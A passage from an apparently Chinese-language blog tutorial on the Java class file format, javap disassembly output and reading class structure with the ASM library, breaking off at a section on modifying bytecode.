24，将十六进制的24转化为十进制值为36，排除掉下标0，也就是说，这个类文件中共有35个常量。</li><li>常量池数据区：数据区是由（constant_pool_count-1）个cp_info结构组成，一个cp_info结构对应一个常量。在字节码中共有14种类型的cp_info，每种类型的结构都是固定的。</li></ul><p><img src="/2023/03/23/Java%E5%AD%97%E8%8A%82%E7%A0%81/1708108426793-9d1d20db-8791-4a18-9891-1edc53e87af0.png"></p><h3 id="访问标记"><a href="#访问标记" class="headerlink" title="访问标记"></a>访问标记</h3><p>常量池结束之后的两个字节为访问标记，描述该Class是类还是接口，以及是否被Public、Abstract、Final等修饰符修饰。JVM并没有穷举所有的访问标志，而是使用按位或操作来进行描述，例如某个类的修饰符为Public Final，则对应的访问修饰符的值为ACC_PUBLIC|ACC_FINAL，即0x0001|0x0010&#x3D;0x0011。</p><p><img src="/2023/03/23/Java%E5%AD%97%E8%8A%82%E7%A0%81/1708109003323-093f8409-bd68-49de-b5f3-c9e565d51afd.png"></p><h3 id="类索引"><a href="#类索引" class="headerlink" title="类索引"></a>类索引</h3><p>访问标志后的两个字节为当前类名，描述的是当前类的全限定名。这两个字节保存的值为常量池中的索引位置，根据索引位置就能在常量池中找到这个类的全限定名。</p><h3 id="超类索引"><a href="#超类索引" class="headerlink" title="超类索引"></a>超类索引</h3><p>类索引后的两个字节为超类索引，描述父类的全限定名，与类索引一样，超类索引保存的也是常量池中的索引值。</p><h3 id="接口表索引"><a href="#接口表索引" class="headerlink" title="接口表索引"></a>接口表索引</h3><p>超类索引后的两个字节为的接口索引表，描述了该类或父类实现的接口数量，紧接着的n个字节是所有接口名称的字符串常量的索引值。</p><h3 id="字段表"><a href="#字段表" class="headerlink" title="字段表"></a>字段表</h3><p>字段表用于描述类和接口中声明的变量，包含类级别的变量以及实例变量，但是不包含方法内部声明的局部变量。字段表也分为两部分，第一部分为两个字节，描述字段个数；第二部分是每个字段的详细信息fields_info。</p><p><img src="/2023/03/23/Java%E5%AD%97%E8%8A%82%E7%A0%81/1708156649121-ffcff39a-92b5-4fd8-8b5a-0e5f46b23817.png"></p><p>字段的访问标记共有9种，例如public static final int DEFAULT_NUM &#x3D; 0，其访问标记的值为0x0019，由ACC_PUBLIC|ACC_STATIC|ACC_FINAL组成。</p><p><img src="/2023/03/23/Java%E5%AD%97%E8%8A%82%E7%A0%81/1708156768651-49c4f078-0cd7-4373-a95f-d046b52da4e9.png"></p><p>对于第三部分的字段描述符，其用来表示某个字段的类型，在JVM中，根据字段类型的不同，字段描述符主要分为以下几种：</p><ul><li>基本数据类型：byte-B、char-C、double-D、float-F、int-I、long-J、short-S、boolean-Z</li><li>特殊类型：void-V</li><li>对象类型：描述符用字符L;加上对象的全限定名来表示，为了防止多个连续的引用类型描述符出现混淆，引用类型描述符最后都加了一个;作为结束，比如字符串类型String的描述符为Ljava&#x2F;lang&#x2F;String;</li><li>数组类型：JVM使用一个前置的[来表示数组类型，例如，int[]类型的描述符为[I，字符串数组String[]的描述符为[Ljava&#x2F;lang&#x2F;String;，每增加一个维度则在对应的字段描述符前增加一个[，比如，Object[][][]类型的描述符为[[[Ljava&#x2F;lang&#x2F;Object;</li></ul><h3 id="方法表"><a href="#方法表" class="headerlink" title="方法表"></a>方法表</h3><p>字段表结束后的为方法表，方法表也是由两部分组成，第一部分为两个字节，描述方法的个数；第二部分为每个方法的详细信息methods_info。方法的详细信息较为复杂，包括访问标记、方法名索引、方法描述符索引以及方法的属性。</p><p><img src="/2023/03/23/Java%E5%AD%97%E8%8A%82%E7%A0%81/1708157930863-446d4ca2-4ed6-4cbf-90e1-b775eecd0288.png"></p><p>方法的访问标记共有12种，例如private static synchronized void demo，其访问标记的值为0x002a，由ACC_PRIVATE|ACC_STATIC|ACC_SYNCHRONIZED组成。</p><p><img src="/2023/03/23/Java%E5%AD%97%E8%8A%82%E7%A0%81/1708157814940-47f8d0fa-1765-43ef-af6b-ddfd35e9e82e.png"></p><p>对于第三部分的字段描述符，其格式如下：(参数1类型 参数2类型 参数3类型 … )返回值类型，例如，方法Object demo(int i, double d, String s)的描述符为(IDLjava&#x2F;lang&#x2F;String;)Ljava&#x2F;lang&#x2F;Object;。</p><h3 id="属性表"><a href="#属性表" class="headerlink" title="属性表"></a>属性表</h3><p>属性表是class文件的最后一部分内容，属性出现的地方比较广泛，除了字段和方法中，在顶层的class文件中也会出现，该项存放了在该文件中类或接口所定义属性的基本信息。</p><h2 id="字节码解析"><a href="#字节码解析" class="headerlink" title="字节码解析"></a>字节码解析</h2><h3 id="javap"><a href="#javap" class="headerlink" title="javap"></a>javap</h3><p>在Java中内置一个反编译命令javap，使用javap可以反编译class文件，将二进制格式的字节码转换成易于理解的格式，从而来查看一个类的结构，包括构造方法、方法、字段等。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javap &lt;options&gt; &lt;classes&gt;</span><br><span class="line"><span class="comment"># 常用方法</span></span><br><span class="line">javap -c -l -v Bytecode.class</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">❯ javap -<span class="built_in">help</span></span><br><span class="line">用法: javap &lt;options&gt; &lt;classes&gt;</span><br><span class="line">其中, 可能的选项包括:</span><br><span class="line">  -<span class="built_in">help</span>  --<span class="built_in">help</span>  -?        输出此用法消息</span><br><span class="line">  -version                 版本信息</span><br><span class="line">  -v  -verbose             输出附加信息</span><br><span class="line">  -l                       输出行号和本地变量表</span><br><span class="line">  -public                  仅显示公共类和成员</span><br><span class="line">  -protected               显示受保护的/公共类和成员</span><br><span class="line">  -package                 显示程序包/受保护的/公共类</span><br><span class="line">                           和成员 (默认)</span><br><span class="line">  -p  -private             显示所有类和成员</span><br><span class="line">  -c                       对代码进行反汇编</span><br><span class="line">  -s                       输出内部类型签名</span><br><span class="line">  -sysinfo                 显示正在处理的类的</span><br><span class="line">                           系统信息 (路径, 大小, 日期, MD5 散列)</span><br><span class="line">  -constants               显示最终常量</span><br><span class="line">  -classpath &lt;path&gt;        指定查找用户类文件的位置</span><br><span class="line">  -<span class="built_in">cp</span> &lt;path&gt;               指定查找用户类文件的位置</span><br><span class="line">  -bootclasspath &lt;path&gt;    覆盖引导类文件的位置</span><br></pre></td></tr></table></figure><p><img src="/2023/03/23/Java%E5%AD%97%E8%8A%82%E7%A0%81/1708156113167-50cce0f6-2e39-4816-8608-1b3f560331b0.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">❯ javap -c -l -v Bytecode.class</span><br><span class="line">Classfile /Users/alphag0/Desktop/Bytecode.class</span><br><span class="line">  Last modified 2024-2-16; size 487 bytes</span><br><span class="line">  MD5 checksum f48d6d0524598aa13585226cdb2ff798</span><br><span class="line">  Compiled from <span class="string">&quot;Bytecode.java&quot;</span></span><br><span class="line">public class Bytecode</span><br><span class="line">  minor version: 0</span><br><span class="line">  major version: 52</span><br><span class="line">  flags: ACC_PUBLIC, ACC_SUPER</span><br><span class="line">Constant pool:</span><br><span class="line">   <span class="comment">#1 = Methodref          #8.#21         // java/lang/Object.&quot;&lt;init&gt;&quot;:()V</span></span><br><span class="line">   <span class="comment">#2 = String             #22            // H3rmesk1t</span></span><br><span class="line">   <span class="comment">#3 = Fieldref           #7.#23         // Bytecode.name:Ljava/lang/String;</span></span><br><span class="line">   <span class="comment">#4 = Fieldref           #7.#24         // Bytecode.age:I</span></span><br><span class="line">   <span class="comment">#5 = Fieldref           #25.#26        // java/lang/System.out:Ljava/io/PrintStream;</span></span><br><span class="line">   <span class="comment">#6 = Methodref          #27.#28        // java/io/PrintStream.println:(I)V</span></span><br><span class="line">   <span class="comment">#7 = Class              #29            // Bytecode</span></span><br><span class="line">   <span class="comment">#8 = Class              #30            // java/lang/Object</span></span><br><span class="line">   <span class="comment">#9 = Utf8               name</span></span><br><span class="line">  <span class="comment">#10 = Utf8               Ljava/lang/String;</span></span><br><span class="line">  <span class="comment">#11 = Utf8               age</span></span><br><span class="line">  <span class="comment">#12 = Utf8               I</span></span><br><span class="line">  <span class="comment">#13 = Utf8               &lt;init&gt;</span></span><br><span class="line">  <span class="comment">#14 = Utf8               ()V</span></span><br><span class="line">  <span class="comment">#15 = Utf8               Code</span></span><br><span class="line">  <span class="comment">#16 = Utf8               LineNumberTable</span></span><br><span class="line">  <span class="comment">#17 = Utf8               add</span></span><br><span class="line">  <span class="comment">#18 = Utf8               ()I</span></span><br><span class="line">  <span class="comment">#19 = Utf8               SourceFile</span></span><br><span class="line">  <span class="comment">#20 = Utf8               Bytecode.java</span></span><br><span class="line">  <span class="comment">#21 = NameAndType        #13:#14        // &quot;&lt;init&gt;&quot;:()V</span></span><br><span class="line">  <span class="comment">#22 = Utf8               H3rmesk1t</span></span><br><span class="line">  <span class="comment">#23 = NameAndType        #9:#10         // name:Ljava/lang/String;</span></span><br><span class="line">  <span class="comment">#24 = NameAndType        #11:#12        // age:I</span></span><br><span class="line">  <span class="comment">#25 = Class              #31            // java/lang/System</span></span><br><span class="line">  <span class="comment">#26 = NameAndType        #32:#33        // out:Ljava/io/PrintStream;</span></span><br><span class="line">  <span class="comment">#27 = Class              #34            // java/io/PrintStream</span></span><br><span class="line">  <span class="comment">#28 = NameAndType        #35:#36        // println:(I)V</span></span><br><span class="line">  <span class="comment">#29 = Utf8               Bytecode</span></span><br><span class="line">  <span class="comment">#30 = Utf8               java/lang/Object</span></span><br><span class="line">  <span class="comment">#31 = Utf8               java/lang/System</span></span><br><span class="line">  <span class="comment">#32 = Utf8               out</span></span><br><span class="line">  <span class="comment">#33 = Utf8               Ljava/io/PrintStream;</span></span><br><span class="line">  <span class="comment">#34 = Utf8               java/io/PrintStream</span></span><br><span class="line">  <span class="comment">#35 = Utf8               println</span></span><br><span class="line">  <span class="comment">#36 = Utf8               (I)V</span></span><br><span class="line">&#123;</span><br><span class="line">  public int age;</span><br><span class="line">    descriptor: I</span><br><span class="line">    flags: ACC_PUBLIC</span><br><span class="line"></span><br><span class="line">  public Bytecode();</span><br><span class="line">    descriptor: ()V</span><br><span class="line">    flags: ACC_PUBLIC</span><br><span class="line">    Code:</span><br><span class="line">      stack=2, locals=1, args_size=1</span><br><span class="line">         0: aload_0</span><br><span class="line">         1: invokespecial <span class="comment">#1                  // Method java/lang/Object.&quot;&lt;init&gt;&quot;:()V</span></span><br><span class="line">         4: aload_0</span><br><span class="line">         5: ldc           <span class="comment">#2                  // String H3rmesk1t</span></span><br><span class="line">         7: putfield      <span class="comment">#3                  // Field name:Ljava/lang/String;</span></span><br><span class="line">        10: aload_0</span><br><span class="line">        11: bipush        21</span><br><span class="line">        13: putfield      <span class="comment">#4                  // Field age:I</span></span><br><span class="line">        16: <span class="built_in">return</span></span><br><span class="line">      LineNumberTable:</span><br><span class="line">        line 1: 0</span><br><span class="line">        line 2: 4</span><br><span class="line">        line 3: 10</span><br><span class="line"></span><br><span class="line">  public int add();</span><br><span class="line">    descriptor: ()I</span><br><span class="line">    flags: ACC_PUBLIC</span><br><span class="line">    Code:</span><br><span class="line">      stack=2, locals=2, args_size=1</span><br><span class="line">         0: aload_0</span><br><span class="line">         1: getfield      <span class="comment">#4                  // Field age:I</span></span><br><span class="line">         4: iconst_1</span><br><span class="line">         5: iadd</span><br><span class="line">         6: istore_1</span><br><span class="line">         7: getstatic     <span class="comment">#5                  // Field java/lang/System.out:Ljava/io/PrintStream;</span></span><br><span class="line">        10: iload_1</span><br><span class="line">        11: invokevirtual <span class="comment">#6                  // Method java/io/PrintStream.println:(I)V</span></span><br><span class="line">        14: iload_1</span><br><span class="line">        15: ireturn</span><br><span class="line">      LineNumberTable:</span><br><span class="line">        line 6: 0</span><br><span class="line">        line 7: 7</span><br><span class="line">        line 8: 14</span><br><span class="line">&#125;</span><br><span class="line">SourceFile: <span class="string">&quot;Bytecode.java&quot;</span></span><br></pre></td></tr></table></figure><h3 id="jclasslib"><a href="#jclasslib" class="headerlink" title="jclasslib"></a>jclasslib</h3><p>相较于javap命令，jclasslib作为一个插件，能够可视化呈现反编译结果，同时还提供了修改jar包中的class文件的API。</p><p><img src="/2023/03/23/Java%E5%AD%97%E8%8A%82%E7%A0%81/1708090817320-6310cec4-5bb6-42ea-bf44-84bedad7d845.png"></p><p><img src="/2023/03/23/Java%E5%AD%97%E8%8A%82%E7%A0%81/1708091018830-ff219ceb-0a75-4a51-b697-8e518db35159.png"></p><h2 id="字节码增强"><a href="#字节码增强" class="headerlink" title="字节码增强"></a>字节码增强</h2><h3 id="ASM"><a href="#ASM" class="headerlink" title="ASM"></a>ASM</h3><p>Java字节码库允许我们通过字节码库的API动态创建或修改Java类、方法、变量等操作而被广泛使用。ASM是一种通用Java字节码操作和分析框架，它可以直接以二进制形式修改一个现有的类或动态生成类文件。</p><p>ASM字节码处理流程：目标类class bytes-&gt;ClassReader解析-&gt;ClassVisitor增强修改字节码-&gt;ClassWriter生成增强后的class bytes-&gt;通过Instrumentation解析加载为新的字节码。</p><p>ASM框架提供了三个基于ClassVisitor API的核心API，用于生成和转换类：</p><ul><li>ClassReader：用于解析class文件或二进制流，并将所有字节码传递给ClassWriter</li><li>ClassVisitor：抽象类，负责访问class文件的各个元素，可以解析或者修改class文件的内容，自定义ClassVisitor重写visitXXX方法，可获取捕获ASM类结构访问的所有事件</li><li>ClassWriter：是ClassVisitor的子类，用于生成类二进制</li></ul><h4 id="ClassReader-ClassVisitor-ClassWriter"><a href="#ClassReader-ClassVisitor-ClassWriter" class="headerlink" title="ClassReader&amp;ClassVisitor&amp;ClassWriter"></a>ClassReader&amp;ClassVisitor&amp;ClassWriter</h4><p>ClassReader类用于解析类字节码，创建ClassReader对象可传入类名、类字节码数组或者类输入流对象。创建完ClassReader对象会触发字节码解析（解析class基础信息，如常量池、接口信息等），可以直接通过ClassReader对象获取类的基础信息。</p><p><img src="/2023/03/23/Java%E5%AD%97%E8%8A%82%E7%A0%81/1708169359643-841308ff-798f-4a1a-a234-8b56f3764261.png"></p><p>调用ClassReader类的accpet方法需要传入自定义的ClassVisitor对象，ClassReader会按照如下顺序，依次调用该ClassVisitor的类方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">visit</span><br><span class="line">        [ visitSource ] [ visitModule ][ visitNestHost ][ visitPermittedclass ][ visitOuterClass ]</span><br><span class="line">        ( visitAnnotation | visitTypeAnnotation | visitAttribute )*</span><br><span class="line">        ( visitNestMember | visitInnerClass | visitRecordComponent | visitField | visitMethod )*</span><br><span class="line">visitEnd</span><br></pre></td></tr></table></figure><p>ClassWriter直接以二进制形式生成编译后的类，他会生成一个字节数组形式的输出，其中包含了已编译的类，可以调用toByteArray方法来提取。</p><p><img src="/2023/03/23/Java%E5%AD%97%E8%8A%82%E7%A0%81/1708169593678-7ea4f5c5-9ed6-4c82-b7e3-ce04da58e68a.png"></p><h4 id="读取和解析字节码"><a href="#读取和解析字节码" class="headerlink" title="读取和解析字节码"></a>读取和解析字节码</h4><h5 id="ClassReader读取字节码"><a href="#ClassReader读取字节码" class="headerlink" title="ClassReader读取字节码"></a>ClassReader读取字节码</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从文件系统中加载字节码</span></span><br><span class="line"><span class="type">byte</span>[] bytecode = Files.readAllBytes(Paths.get(<span class="string">&quot;path/to/MyClass.class&quot;</span>));</span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line"> <span class="type">FileInputStream</span> <span class="variable">bytecode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;path/to/MyClass.class&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从类加载器中加载字节码</span></span><br><span class="line"><span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> getClass().getClassLoader().getResourceAsStream(<span class="string">&quot;com/example/MyClass.class&quot;</span>);</span><br><span class="line"><span class="type">byte</span>[] bytecode = is.readAllBytes();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建ClassReader实例</span></span><br><span class="line"><span class="type">ClassReader</span> <span class="variable">classReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(bytecode);</span><br></pre></td></tr></table></figure><h5 id="ClassVisitor解析字节码"><a href="#ClassVisitor解析字节码" class="headerlink" title="ClassVisitor解析字节码"></a>ClassVisitor解析字节码</h5><ul><li>实验类</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.asm.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BytecodeTest</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;H3rmesk1t&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">22</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">process</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Name: &quot;</span> + name);</span><br><span class="line">        System.out.println(<span class="string">&quot;Age: &quot;</span> + age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>访问者类</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.asm.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ASMClassVisitor</span> <span class="keyword">extends</span> <span class="title class_">ClassVisitor</span> &#123;</span><br><span class="line">    <span class="comment">// 调用父类构造方法, 使用ASM Opcodes版本</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">ASMClassVisitor</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(Opcodes.ASM5);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 重写visit方法, 输出类名</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visit</span><span class="params">(<span class="type">int</span> version, <span class="type">int</span> access, String name, String signature, String superName, String[] interfaces)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;变量修饰符: &quot;</span> + access + <span class="string">&quot;\t 类名: &quot;</span> + name + <span class="string">&quot;\t 父类名: &quot;</span> + superName + <span class="string">&quot;\t 实现的接口: &quot;</span> + Arrays.toString(interfaces));</span><br><span class="line">        System.out.println(<span class="string">&quot;-----------------------------------------------------------------------------&quot;</span>);</span><br><span class="line">        <span class="built_in">super</span>.visit(version, access, name, signature, superName, interfaces);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 重写visitMethod方法, 输出方法名</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> MethodVisitor <span class="title function_">visitMethod</span><span class="params">(<span class="type">int</span> access, String name, String descriptor, String signature, String[] exceptions)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;变量修饰符: &quot;</span> + access + <span class="string">&quot;\t 变量名称: &quot;</span> + name + <span class="string">&quot;\t 描述符: &quot;</span> + descriptor + <span class="string">&quot;\t 抛出的异常: &quot;</span> + Arrays.toString(exceptions));</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.visitMethod(access, name, descriptor, signature, exceptions);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 重写visitField, 输出变量名</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> FieldVisitor <span class="title function_">visitField</span><span class="params">(<span class="type">int</span> access, String name, String descriptor, String signature, Object value)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;变量修饰符：&quot;</span> + access + <span class="string">&quot;\t 变量名称：&quot;</span> + name + <span class="string">&quot;\t 描述符：&quot;</span> + descriptor + <span class="string">&quot;\t 默认值：&quot;</span> + value);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.visitField(access, name, descriptor, signature, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>主类</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.asm.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.ClassReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ASMMain</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 实例化自定义Visitor</span></span><br><span class="line">        <span class="type">ASMClassVisitor</span> <span class="variable">asmClassVisitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ASMClassVisitor</span>();</span><br><span class="line">        <span class="comment">// 加载字节码</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;/Users/alphag0/Desktop/Code/Java/JavaSecCode/src/main/java/org/example/asm/demo/BytecodeTest.class&quot;</span>);</span><br><span class="line">        <span class="type">ClassReader</span> <span class="variable">classReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(inputStream);</span><br><span class="line">        System.out.println(<span class="string">&quot;解析类名: &quot;</span> + classReader.getClassName() + <span class="string">&quot;，父类: &quot;</span> + classReader.getSuperName() + <span class="string">&quot;，实现接口: &quot;</span> + Arrays.toString(classReader.getInterfaces()));</span><br><span class="line">        System.out.println(<span class="string">&quot;-----------------------------------------------------------------------------&quot;</span>);</span><br><span class="line">        classReader.accept(asmClassVisitor, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/03/23/Java%E5%AD%97%E8%8A%82%E7%A0%81/1708177827947-652074b4-5029-4ddc-8503-7d2237c74834.png"></p><h4 id="修改字节码"><a href="#修改字节码" class="headerlink" title="修改字节码"></a>修改字节码</h4><p><font style="color:rgb(51, 51, 51);">使用</font><font style="color:rgb(51, 51, 51);">ClassWriter</font><font style="color:rgb(51, 51, 51);">可以实现类修改功能，使用</font><font style="color:rgb(51, 51, 51);">ASM</font><font style="color:rgb(51, 51, 51);">修改类字节码时如果插入了新的局部变量、字节码，需要重新计算</font><font style="color:rgb(51, 51, 51);">max_stack</font><font style="color:rgb(51, 51, 51);">和</font><font style="color:rgb(51, 51, 51);">max_locals</font><font style="color:rgb(51, 51, 51);">，否则会导致修改后的类文件无法通过</font><font style="color:rgb(51, 51, 51);">JVM</font><font style="color:rgb(51, 51, 51);">校验。</font><font style="color:rgb(51, 51, 51);">ASM</font><font style="color:rgb(51, 51, 51);">提供了内置的自动计算方式，只需在创建</font><font style="color:rgb(51, 51, 51);">ClassWriter</font><font style="color:rgb(51, 51, 51);">的时候传入</font><font style="color:rgb(51, 51, 51);">COMPUTE_FRAMES</font><font style="color:rgb(51, 51, 51);">即可：</font><font style="color:rgb(51, 51, 51);">new ClassWriter(cr, ClassWriter.COMPUTE_FRAMES);</font><font style="color:rgb(51, 51, 